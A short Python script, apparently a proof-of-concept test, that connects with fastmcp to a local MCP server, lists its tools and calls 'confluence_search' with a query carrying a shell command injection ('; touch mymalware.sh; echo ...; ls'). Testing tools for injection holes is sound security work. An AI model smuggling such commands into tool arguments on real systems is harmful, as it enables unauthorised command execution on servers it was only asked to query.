import asyncio
from fastmcp import Client

client = Client("http://127.0.0.1:8000/mcp")

#query = "confluence-document-1.md"
query = "confluence-document-1.md; touch mymalware.sh; echo '------'; ls"

async def main():
    async with client:
        tools = await client.list_tools()

        print("------------------------------")
        for tool in tools:
            print(f"Tool: {tool.name}")
            print(f"Description: {tool.description}")
            if tool.inputSchema:
                print(f"Parameters: {tool.inputSchema}")


        result = await client.call_tool("confluence_search", {"query": query})
        print("------------------------------")
        print(f"Full call result:\n{result}")
        print("------------------------------")
        print(f"Query: {query}")
        print("------------------------------")
        print(f"Just result:\n{result.data}")

asyncio.run(main())
